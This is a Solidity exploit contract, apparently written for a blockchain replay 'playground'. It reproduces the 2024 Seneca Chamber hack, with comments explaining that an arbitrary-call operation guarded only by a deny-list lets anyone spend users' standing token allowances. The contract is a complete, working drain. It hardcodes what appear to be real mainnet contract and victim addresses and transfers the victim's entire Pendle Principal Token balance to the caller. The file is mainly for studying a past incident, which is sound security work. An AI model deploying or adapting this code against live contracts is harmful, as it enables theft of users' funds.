// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-02-Seneca).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (attacker == address(this); testExploit() just builds calldata and calls
// Chamber.performOperations() directly — there is no standalone exploit
// contract). This contract is a faithful, self-contained copy of that inline
// attack (entrypoint `run()` mirrors testExploit()'s body) so the playground
// can deploy it and record run(). Logic and constants are copied verbatim
// from test/Seneca_exp.sol.
//
// Root cause: Chamber.performOperations()'s OPERATION_CALL action lets ANY
// caller direct the Chamber to make an arbitrary external call
// (callee.call(callData)), guarded only by a deny-list containing the
// bentoBox + the Chamber itself. Because users had granted the Chamber
// (clone) an unlimited ERC-20 allowance, the attacker asks the Chamber to
// call `PendlePrincipalToken.transferFrom(victim, attacker, victimBalance)`
// on its own behalf — the token sees the Chamber as msg.sender, the standing
// allowance is satisfied, and the victim's entire balance is swept out.

interface IChamber {
    function performOperations(uint8[] memory actions, uint256[] memory values, bytes[] memory datas)
        external
        payable
        returns (uint256 value1, uint256 value2);
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
}

contract SenecaDrain {
    IChamber private constant CHAMBER = IChamber(0x65c210c59B43EB68112b7a4f75C8393C36491F06);
    IERC20 private constant PENDLE_PRINCIPAL_TOKEN = IERC20(0xB05cABCd99cf9a73b19805edefC5f67CA5d1895E);
    address private constant VICTIM = 0x9CBF099ff424979439dFBa03F00B5961784c06ce;
    uint8 private constant OPERATION_CALL = 30;

    // Mirrors testExploit(): build one OPERATION_CALL action whose payload
    // makes the Chamber itself call transferFrom(victim, attacker, balance)
    // on the Pendle Principal Token, using the Chamber's standing allowance.
    function run() external {
        uint256 amount = PENDLE_PRINCIPAL_TOKEN.balanceOf(VICTIM);
        bytes memory callData = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)", VICTIM, address(this), amount
        );
        bytes memory data = abi.encode(address(PENDLE_PRINCIPAL_TOKEN), callData, uint256(0), uint256(0), uint256(0));
        bytes[] memory datas = new bytes[](1);
        datas[0] = data;

        uint8[] memory actions = new uint8[](1);
        actions[0] = OPERATION_CALL;

        uint256[] memory values = new uint256[](1);
        values[0] = uint256(0);

        CHAMBER.performOperations(actions, values, datas);
    }
}
